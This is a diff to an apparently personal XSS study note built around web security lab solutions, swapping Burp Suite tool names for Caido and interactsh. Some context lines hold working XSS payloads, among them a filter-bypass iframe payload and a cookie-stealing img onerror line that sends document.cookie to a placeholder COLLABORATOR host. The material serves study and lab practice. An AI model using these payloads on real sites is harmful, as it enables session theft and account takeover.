@@ -372,7 +372,7 @@ If `unsafe-inline` is present in `script-src`, inline `<script>` tags execute no
 If `unsafe-eval` is present, `eval()` and `new Function()` execute.
 Overly broad CSP whitelisting CDN origins can allow JSONP or Angular template injection bypasses.
 
-### Tag/attribute enumeration via Burp Intruder
+### Tag/attribute enumeration via Caido Automate
 
 When a WAF blocks most tags and attributes, use the PortSwigger XSS cheat sheet tag/event-handler lists as Intruder payloads (Sniper for attributes, Battering Ram for tags). Look for 200 responses vs "Tag is not allowed" / "Attribute is not allowed" responses to build the allowed set, then construct payloads from the intersection.
 
@@ -542,9 +542,9 @@ Brave Software paid **$1,000** for an XSS in the iOS Reader Mode implementation.
 
 ## Tools
 
-- [[burp-suite]] — intercept, replay, Intruder fuzzing for tag/event-handler enumeration
-- Burp Collaborator — out-of-band exfil endpoint for blind XSS / cookie / password capture
-- DOM Invader (Burp Suite built-in) — automatic source/sink discovery for DOM-based XSS in Chrome
+- [[caido]] — intercept, replay, Automate fuzzing for tag/event-handler enumeration
+- interactsh/OAST — out-of-band exfil endpoint for blind XSS / cookie / password capture
+- DOM Invader (Burp built-in browser) — automatic source/sink discovery for DOM-based XSS in Chrome (Burp-only; no Caido equivalent)
 - Browser DevTools — DOM inspection, Console for prototype testing, `Ctrl+U` to view page source
 - BeEF — Browser Exploitation Framework for post-exploitation after XSS
 
@@ -769,7 +769,7 @@ Comment body processed by client-side JS into `innerHTML` with `<p>` wrapper. Br
 ```
 
 #### LAB 14 — Reflected XSS into HTML context with most tags and attributes blocked
-Use Burp Intruder to enumerate allowed tags and event handlers. Allowed: `body`, custom tags; allowed events include `onresize`, `onbeforeinput`, `onscrollend`. Deliver via iframe auto-resize:
+Use Caido Automate to enumerate allowed tags and event handlers. Allowed: `body`, custom tags; allowed events include `onresize`, `onbeforeinput`, `onscrollend`. Deliver via iframe auto-resize:
 ```html
 <iframe src="https://TARGET/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload=this.style.width='100px'></iframe>
 ```
@@ -823,7 +823,7 @@ ${alert(1)}
 ```
 
 #### LAB 22 — Exploiting XSS to steal cookies
-Stored XSS via comment body. Exfiltrate `document.cookie` via `onerror` redirect to Burp Collaborator:
+Stored XSS via comment body. Exfiltrate `document.cookie` via `onerror` redirect to interactsh/OAST:
 ```html
 </p><img src=x onerror='document.location="https://COLLABORATOR/?cookies="+document.cookie' /><p>
 ```
